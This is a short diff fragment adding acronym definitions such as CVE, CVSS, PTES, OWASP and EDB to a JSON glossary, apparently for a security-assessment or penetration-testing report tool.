+    {"term": "CWE", "definition": "Common Weakness Enumeration"},
+    {"term": "CVE", "definition": "Common Vulnerabilities and Exposures"},
+    {"term": "CVSS", "definition": "Common Vulnerability Scoring System"},
+    {"term": "PTES", "definition": "Penetration Testing Execution Standard"},
+    {"term": "OWASP", "definition": "Open Worldwide Application Security Project"},
+    {"term": "MFA", "definition": "Multi-Factor Authentication"},
+    {"term": "IAM", "definition": "Identity & Access Management"},
+    {"term": "EDB", "definition": "Exploit Database (exploit-db.com)"},
+    {"term": "EOL", "definition": "End of Life"},
+    {"term": "NA", "definition": "Not Applicable"}
+  ]
+}
